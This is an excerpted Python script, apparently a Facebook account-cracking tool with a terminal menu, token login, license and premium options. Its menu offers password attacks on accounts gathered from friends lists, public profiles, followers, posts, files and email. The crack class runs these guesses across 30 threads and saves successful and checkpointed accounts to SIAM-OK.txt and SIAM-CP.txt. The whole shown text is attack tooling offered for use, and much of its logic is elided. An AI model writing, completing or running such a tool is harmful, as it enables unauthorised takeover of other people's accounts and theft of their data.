...
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Author   : ˢ̳ᶦ̳ᵃ̳ᵐ̳⁻̳⁰̳⁰̳⁰̳⁰̳⁰̳
	...
	def __login__(self):
		...
		if token in ['']:
			...
			try:
				...
				print('\n [%s+%s] Login successfully ☑️ %s'%(H,N,cc))
				self.bot()
			except KeyError:
...
class menu:
	...
	def main(self):
		...
		print(' %s║'%(N))
		print(' %s╠═[%s•%s] Access your license   : %s'%(N,O,N,akss))
		print(' %s╠═[%s•%s] Your current IP address : %s'%(N,O,N,IP))
		print(' %s╠═[%s•%s] You are logged in         : %s'%(N,O,N,waktu))
		print(' %s║'%(N))
		print(' %s╠═[%s0%s] crack from friends list     [ON]'%(N,O,N))
		print(' %s╠═[%s1%s] crack from public account      [ON]'%(N,O,N))
		print(' %s╠═[%s2%s] crack from bulk account    [ON]'%(N,O,N))
		print(' %s╠═[%s3%s] crack from post       [ON]'%(N,O,N))
		print(' %s╠═[%s4%s]  crack from file     [ON]'%(N,O,N))
		print(' %s╠═[%s5%s] crack from followers         [ON]'%(N,O,N))
		print(' %s╠═[%s6%s] check checkpoint account options  [ON]'%(N,O,N))
		print(' %s╠═[%s7%s] check the crack results ok, cp       [ON]'%(N,O,N))
		print(' %s╠═[%s8%s] User-Agent settings            [ON]'%(N,O,N))
		print(' %s╠═[%s9%s] email crack                       [ON]'%(N,O,N))
		print(' %s╠═[%sG%s] Get facebook data       [ON]'%(N,O,N))
		print(' %s╠═[%sK%s] Script bug report.             [ON]'%(N,O,N))
		print(' %s╠═[%sA%s] Keluar, hapus token[         [ON]'%(N,O,N))
		print(' %s╠═[%sU%s] Upgrade to premium        [ON]'%(N,O,N))
		self.pilih()
	...
	def pilih(self):
		...
		if usna in ['']:
			...
			try:
				...
				print(' %s╚═[%s!%s] Your account is not public...'%(N,M,N));time.sleep(2);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['1','01']:
			try:
			...
			print(' %s║'%(N))
			print(' %s╠═[%s1%s] Check SIAM ok'%(N,O,N))
			print(' %s╠═[%s2%s] Check SIAM cp'%(N,O,N))
...
class crack:
	...
	def fbeh(self,id):
		...
		kham = input(' %s╠═[%s?%s] Use manual password y/t : '%(N,O,N))
		if kham in ['']:
			print(' %s╠═[%s!%s] Jangan kozong !'%(N,M,N));time.sleep(2);crack().fbeh(id)
		elif kham in ['y','Y','Iya','iya']:
			print(' %s║'%(N))
			print(' %s╠═[%s!%s] Use comma for example separation : dear,password'%(N,O,N))
			while True:
				pw = input(' %s╠═[%s•%s] Enter password : '%(N,O,N))
				if pw in ['']:
					print(' %s╠═[%s!%s] Jangan kosong mmk'%(N,M,N))
				elif len(pw)<=5:
					print(' %s╠═[%s!%s] Password must have 6 words or more !!'%(N,M,N))
				else:
					def manual(xnxx=None):
						...
						if mani in ['']:
							...
							print(' %s║'%(N))
							print(' ╠═[%s*%s] Ok account will be saved in file : SIAM-OK.txt'%(O,N))
							print(' ╚═[%s*%s] Cp account will be saved in file : SIAM-CP.txt\n'%(O,N))
							...
							print(' %s║'%(N))
							print(' %s╠═[%s*%s] Ok account will be saved in file : SIAM-OK.txt'%(N,O,N))
							print(' %s╚═[%s*%s] Ok account will be saved in file : SIAM-CP.txt\n'%(N,O,N))
							with khamdihiXD(max_workers=30) as dihi:
								for me in self.id:
									try:
										Nufikha = me.split('<=>')[0]
							...
							print(' %s║'%(N))
							print(' %s╠═[%s*%s] Ok account will be saved in file : SIAM-OK.txt'%(N,O,N))
							print('%s ╚═[%s*%s] Cp account will be saved in file : SIAM-CP.txt\n'%(N,O,N))
							with khamdihiXD(max_workers=30) as dihi:
								for me in self.id:
									try:
										Nufikha = me.split('<=>')[0]
	...
	def free(self):
		print(' %s║'%(N))
		print(' %s╠═[%s*%s] okay account will be saved in the file : SIAM-OK.txt'%(N,O,N))
		print(' %s╠═[%s*%s] chkpoint account will be saved in the file : SIAM-OK.txt\n'%(N,O,N))
		with khamdihiXD(max_workers=30) as dihi:
			for me in self.id:
				try:
					uid, name = me.split('<=>')
